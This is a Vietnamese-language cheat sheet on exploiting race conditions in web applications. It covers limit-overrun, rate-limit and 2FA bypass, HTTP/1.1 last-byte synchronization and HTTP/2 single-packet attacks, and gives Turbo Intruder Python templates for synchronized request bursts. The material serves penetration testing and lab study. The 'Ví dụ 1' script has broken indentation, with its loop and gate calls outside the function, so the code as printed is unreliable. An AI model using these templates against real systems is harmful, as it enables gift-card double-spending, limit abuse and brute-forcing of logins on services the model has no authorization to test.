# Race Condition

> Race condition có thể xảy ra khi một process phụ thuộc một cách nghiêm trọng hoặc ngoài dự kiến vào thứ tự hoặc thời điểm xảy ra của các sự kiện khác. Trong môi trường web application, nơi nhiều request có thể được xử lý cùng lúc, developer có thể giao việc xử lý concurrency cho framework, server hoặc programming language.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)

  * [Limit-overrun](#limit-overrun)
  * [Bypass Rate-limit](#rate-limit-bypass)
* [Kỹ thuật](#techniques)

  * [HTTP/1.1 Last-byte Synchronization](#http11-last-byte-synchronization)
  * [HTTP/2 Single-packet Attack](#http2-single-packet-attack)
* [Turbo Intruder](#turbo-intruder)

  * [Ví dụ 1](#example-1)
  * [Ví dụ 2](#example-2)
* [Labs](#labs)
* [Tài liệu tham khảo](#references)

## Công cụ

* https://github.com/PortSwigger/turbo-intruder - Một Burp Suite extension dùng để gửi số lượng lớn HTTP request và phân tích kết quả.
* https://github.com/JavanXD/Raceocat - Giúp việc khai thác race condition trong web application trở nên hiệu quả và dễ sử dụng hơn.
* https://github.com/nxenon/h2spacex - HTTP/2 Single Packet Attack Low Level Library / Tool dựa trên Scapy‌ + khai thác Timing Attack

## Phương pháp

### Limit-overrun

Limit-overrun đề cập đến tình huống nhiều thread hoặc process cùng tranh chấp để cập nhật hoặc truy cập một shared resource, khiến resource vượt quá giới hạn được thiết kế.

**Ví dụ**: Vượt giới hạn rút tiền, bỏ phiếu nhiều lần, chi tiêu nhiều lần từ gift card.

* [Race Condition allows to redeem multiple times gift cards which leads to free "money" - @muon4](https://hackerone.com/reports/759247)
* [Race conditions can be used to bypass invitation limit - @franjkovic](https://hackerone.com/reports/115007)
* [Register multiple users using one invitation - @franjkovic](https://hackerone.com/reports/148609)

### Bypass Rate-limit

Bypass rate-limit xảy ra khi kẻ tấn công khai thác việc thiếu cơ chế đồng bộ phù hợp trong hệ thống rate-limiting để vượt quá giới hạn request được dự kiến. Rate-limiting được thiết kế để kiểm soát tần suất của các hành động (ví dụ: API request, login attempt), nhưng race condition có thể cho phép kẻ tấn công bypass các giới hạn này.

**Ví dụ**: Bypass cơ chế chống brute-force và 2FA.

* [Instagram Password Reset Mechanism Race Condition - Laxman Muthiyah](https://youtu.be/4O9FjTMlHUM)

## Kỹ thuật

### HTTP/1.1 Last-byte Synchronization

Gửi mọi request ngoại trừ byte cuối cùng, sau đó "release" từng request bằng cách gửi byte cuối cùng.

Thực hiện last-byte synchronization bằng Turbo Intruder

```py
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')
```

**Ví dụ**:

* [Cracking reCAPTCHA, Turbo Intruder style - James Kettle](https://portswigger.net/research/cracking-recaptcha-turbo-intruder-style)

### HTTP/2 Single-packet Attack

Trong HTTP/2, bạn có thể gửi nhiều HTTP request đồng thời thông qua một connection duy nhất. Trong single-packet attack, khoảng ~20/30 request sẽ được gửi và chúng sẽ đến server cùng một thời điểm. Sử dụng một request duy nhất giúp loại bỏ network jitter.

* [PortSwigger/turbo-intruder/race-single-packet-attack.py](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py)
* Burp Suite

  * Gửi một request tới Repeater
  * Duplicate request 20 lần (CTRL+R)
  * Tạo một group mới và thêm tất cả request vào group
  * Gửi group song song (single-packet attack)

**Ví dụ**:

* [CVE-2022-4037 - Discovering a race condition vulnerability in Gitlab with the single-packet attack - James Kettle](https://youtu.be/Y0NVIVucQNE)

## Turbo Intruder

### Ví dụ 1

1. Gửi request tới Turbo Intruder

2. Sử dụng Python code này làm payload của Turbo Intruder

   ```python
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
       engine.queue(target.req, i)
           engine.queue(target.req, target.baseInput, gate='race1')


       engine.start(timeout=5)
   engine.openGate('race1')

       engine.complete(timeout=60)


   def handleResponse(req, interesting):
       table.add(req)
   ```

3. Bây giờ đặt external HTTP header `x-request: %s` - :warning: Điều này cần thiết cho Turbo Intruder

4. Nhấn "Attack"

### Ví dụ 2

Template sau có thể được sử dụng khi bạn cần gửi request2 ngay lập tức sau khi gửi request1, trong trường hợp race window chỉ có thể kéo dài vài milliseconds.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    request1 = '''
POST /target-URI-1 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>

parameterName=parameterValue
    '''

    request2 = '''
GET /target-URI-2 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)
def handleResponse(req, interesting):
    table.add(req)
```

## Labs

* [PortSwigger - Limit overrun race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)
* [PortSwigger - Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
* [PortSwigger - Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
* [PortSwigger - Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
* [PortSwigger - Single-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)
* [PortSwigger - Exploiting time-sensitive vulnerabilities](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
* [PortSwigger - Partial construction race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)

## Tài liệu tham khảo

* [Beyond the Limit: Expanding single-packet race condition with a first sequence sync for breaking the 65,535 byte limit - @ryotkak - August 2, 2024](https://web.archive.org/web/20251116040307/https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
* [DEF CON 31 - Smashing the State Machine the True Potential of Web Race Conditions - James Kettle (@albinowax) - September 15, 2023](https://web.archive.org/web/20231018114533/https://youtu.be/tKJzsaB1ZvI)
* [Exploiting Race Condition Vulnerabilities in Web Applications - Javan Rasokat - October 6, 2022](https://web.archive.org/web/20221006190254/http://conference.hitb.org/hitbsecconf2022sin/materials/D2%20COMMSEC%20-%20Exploiting%20Race%20Condition%20Vulnerabilities%20in%20Web%20Applications%20-%20Javan%20Rasokat.pdf)
* [New techniques and tools for web race conditions - Emma Stocks - August 10, 2023](https://web.archive.org/web/20230810160828/https://portswigger.net/blog/new-techniques-and-tools-for-web-race-conditions)
* [Race Condition Bug In Web App: A Use Case - Mandeep Jadon - April 24, 2018](https://web.archive.org/web/20260302041740/https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e)
* [Race conditions on the web - Josip Franjkovic - July 12, 2016](https://web.archive.org/web/20160712132451/https://www.josipfranjkovic.com/blog/race-conditions-on-web)
* [Smashing the state machine: the true potential of web race conditions - James Kettle (@albinowax) - August 9, 2023](https://web.archive.org/web/20230809185504/https://portswigger.net/research/smashing-the-state-machine)
* [Turbo Intruder: Embracing the billion-request attack - James Kettle (@albinowax) - January 25, 2019](https://web.archive.org/web/20190929052757/https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
